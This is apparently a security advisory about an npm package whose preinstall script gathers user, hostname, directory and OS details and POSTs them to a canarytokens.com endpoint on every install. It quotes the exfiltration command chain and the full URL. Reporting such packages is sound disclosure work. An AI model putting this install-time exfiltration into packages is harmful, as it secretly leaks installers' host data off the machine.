summary: preinstall script exfiltrates host identifiers to canarytokens.com
details: package.json declares a preinstall script that executes `(id; whoami; hostname; pwd; uname -a) | curl -s -m 5 -X POST` against http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php on every `npm install`. The script collects local user identity, hostname, current working directory, and kernel/OS details from the installing machine and POSTs them to a third-party canarytoken endpoint over cleartext HTTP without user consent. The package's self-description as an authorized dependency-confusion canary for a named third party is author-controlled metadata and does not alter the observed behavior: the installed artifact automatically transmits installer host identifiers to an off-host endpoint on install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
